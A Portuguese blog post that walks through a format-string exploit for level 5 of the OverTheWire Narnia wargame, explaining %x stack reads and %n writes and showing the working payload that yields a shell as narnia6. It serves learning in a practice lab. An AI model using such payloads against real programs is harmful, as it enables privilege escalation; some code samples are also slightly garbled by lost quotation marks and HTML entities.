---
layout: default
title: Level 5 - Format String Attack [OverTheWire CTF – Narnia] write-up
date: 2017-05-31 17:14
author: brennords
comments: true
categories: [CTFs]
---
<ul>
    <li style="text-align:justify;"><a href="https://brenn0.wordpress.com/2016/12/06/level-0-overthewire-ctf-narnia-write-up/">Level 0</a></li>
    <li style="text-align:justify;"><a href="https://brenn0.wordpress.com/2016/12/13/level-1-overthewire-ctf-narnia-write-up/">Level 1</a></li>
    <li style="text-align:justify;"><a href="https://brenn0.wordpress.com/2017/01/03/level-2-overthewire-ctf-narnia-write-up/">Level 2</a></li>
    <li style="text-align:justify;"><a href="https://brenn0.wordpress.com/2017/01/07/level-3-overthewire-ctf-narnia-write-up/">Level 3</a></li>
    <li style="text-align:justify;"><a href="https://brenn0.wordpress.com/2017/01/15/level-4-overthewire-ctf-narnia-write-up/">Level 4</a></li>
</ul>

Quem diria que é mais trabalhoso escrever writeup do que resolver os desafios? Mas continuo firme e forte na tentativa de documentar e ensinar um pouco que sei para os próximos 1337 afim de aprender.

Hora de ownar o <strong>narnia5</strong>.

https://gist.github.com/anonymous/f6fb1753c42a085a65b9cc1f21948bdf

O objetivo é claro, mudar o valor da variável <strong>i</strong> de 1 para 500. Hora de ver o código e criar teorias de como fazer isso.

https://gist.github.com/anonymous/d743b46c946ffe171ea2a2ca5aa04f6f

No inicio da função, <strong>i</strong> recebe o valor 1 e <strong>buffer</strong> é declarado como um vetor de char de tamanho 64. Depois, <a href="http://www.cplusplus.com/reference/cstdio/snprintf/">snprintf</a> manda para buffer 64 caracteres do argumento que passamos para o programa. É aqui que mora a vulnerabilidade que vai permitir mudar o valor de i.

snprintf recebe como argumentos: um ponteiro para o buffer onde será guardado o valor, o tamanho máximo de bytes que será copiado para o buffer e uma string (também podem haver argumentos opcionais). Se a função for chamada desta forma: <em>snprintf(buffer, 100, "Sou uma %s", "string")</em>, irá salvar em buffer o valor <em>"Sou uma string"</em> porque substitui o <em>%s</em> pelo argumento seguinte, a palavra <em>"string"</em>. É tipo o que <a href="http://www.cplusplus.com/reference/cstdio/printf/">printf</a> faria, mas ao invés de imprimir na tela, salva o resultado em algum lugar.

Assim como os outros da família printf, snprintf quando usada de forma relapsa abre espaço para ataques de <a href="https://www.owasp.org/index.php/Format_string_attack">format string</a>.

Uma<em> format string </em>é uma string ASCII que pode conter texto e parâmetros de formatação.

```printf(Sua senha do facebook é %s, x41Ax41A)```

A tal <em>format string</em> seriam os argumentos para a função printf aí de cima. Você pode ver que, ao executar esta linha, a função espera uma string como argumento para substituir o identificador %s.

Há outros identificadores como %d para inteiros, %c para caracteres, %x para hexademical, %p para ponteiros, %n que te digo a utilidade depois...

No chall, a função está sendo chamada passando como argumento de formatação o que digitarmos:

```snprintf(buffer, sizeof buffer, argv[1])```

Ao invés do correto, que seria:

```snprintf(buffer, sizeof buffer, %s, argv[1])```

No primeiro caso, temos controle da string de formatação. Isto significa que inserir como argumento um "%s" fará com que snprintf tente imprimir uma string. Mesmo que essa string não exista.

```narnia5@narnia:/narnia$ ./narnia5 %s
Change i's value from 1 -500. No way...let me give you a hint!
buffer : [▒▒u^▒L9L$▒Av9▒D▒] (23)
i = 1 (0xffffd74c)```

Consegue ver essa quantidade de lixo? Isso acontece porque, em uma chamada saudável para snprintf, por exemplo: <em>snprintf(buffer, 25, "%d %s", a, &amp;b)</em>  os dados ficariam organizados dessa forma:

```(topo da stack)
Endereço_de_retorno -
endereço_de_b -
valor_de_a
...
(fundo da stack)```

É na stack que snprintf espera que os valores ou endereço destes valores estejam. Assim, não importa se esses valores tenham ou não sido passados como argumento para a função, snprintf irá ler o que estiver na stack.

Há uma forma de ver esse mal comportamento na prática usando o chall. Ao passar argumentos suficientes, é possível ler o próprio argumento da stack.

```narnia5@narnia:/narnia$ ./narnia5 AAAA.%x.%x.%x.%x.%x
Change i's value from 1 -500. No way...let me give you a hint!
buffer : [AAAA.f7eb7fe6.ffffffff.ffffd71e.f7e2ec34.41414141] (49)
i = 1 (0xffffd73c)```

Usei %x para imprimir os valores em hex e você pode ver que o quinto %x foi substituído pelo valor <em><a href="https://pt.wikipedia.org/wiki/ASCII">41414141</a></em>.

Bom, ler conteúdo arbitrário da memória têm suas <a href="https://security.stackexchange.com/questions/43489/can-i-read-write-canary-values-from-gs-register/43844#43844">utilidades</a>. Mas o objetivo é ganhar uma shell. E para isso acontecer, não é preciso ler e sim sobrescrever i.

É aí que entra o especificador %n. Ao contrário de todos outros, sua utilidade não é formatar para apresentar um valor e sim escrever.

O %n escreve, na variável que for especificada, o número de bytes que foram escritos antes dele.

```printf(12345%n, &amp;variavel)```

A linha de código acima, além de imprimir "<em>12345</em>", irá escrever o inteiro 5 em <em>variavel</em>.

O programa é amigável e ainda nos informa em que lugar da memória está guardado o valor da variável i. Tudo que é preciso é: explorar a format string para escrever 500 bytes e escrever %n no endereço de i.

Agora saindo da teoria para a prática.

Lembra como, após alguns endereços, se consegue imprimir o próprio valor inserido? É dessa forma que passamos o endereço de i.

```narnia5@melinda:/narnia$ ./narnia5 `python -c 'print \xdc\xd6\xff\xff%x%x%x%x%n &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;'`
Change i's value from 1 -500. No way...let me give you a hint!
buffer : [▒▒▒▒f7eb7746ffffffffffffd6bef7e2fc34] (36)
i = 36 (0xffffd6dc)```

Uow, viu isso? Vamos por partes:

No começo do argumento venenoso que mandei (usei o python para escrever no formato que se deve mas, se simplesmente não entendeu o que fiz, tente ler os <a href="https://brenn0.wordpress.com/category/ctfs/over-the-wire/narnia/">write-ups anteriores do narnia</a> que é onde explico mais cuidadosamente esses paranauê) temos <em>ff ff d6 dc</em>, o endereço de i.

Após o endereço, usei uns %x para sair puxando uns valores da stack até chegar no início do meu próprio argumento, que será <em>ff ff d6 dc</em>. E é ai que entra o %n, que vai alegremente escrever a quantidade de bytes já escritos em <em>ff ff d6 dc</em>.

Por esse motivo que i teve seu valor substituído por 36. Não é por coincidência que o tamanho de buffer também seja 36.

Agora se pode passar um argumento com 500 bytes e ver /bin/sh ser executado com privilégios de narnia6.

```narnia5@melinda:/narnia$ ./narnia5 `python -c 'print \xdc\xd6\xff\xff%-472s%x%x%x%n'`
Change i's value from 1 -500. GOOD
$ cat /etc/narnia_pass/narnia5
cat: /etc/narnia_pass/narnia5: Permission denied
$ whoami
narnia6```

Nem precisa escrever na mão os 500. O <a href="https://stackoverflow.com/questions/276827/string-padding-in-c">%472s</a> faz o trabalho de preencher o buffer.

Esse desafio só arranha bem pouco a superfície que é o poder que se tem ao explorar uma falha em format strings. Ao contrário de stack overflows simples (sem nenhuma contramedida), que são raríssimos de se ver na prática hoje em dia, format strings ainda são exploradas atualmente. Mesmo que na maioria das vezes seja apenas como um "meio" para o exploit funcionar. O que quis dizer é que: se você for buscar conhecimento, vai encontrar altas maneiras extravagantes e quase mágicas de se usar uma falha desse tipo para vários fins. Cheque <a href="https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf">este PDF </a>se ficou curioso.
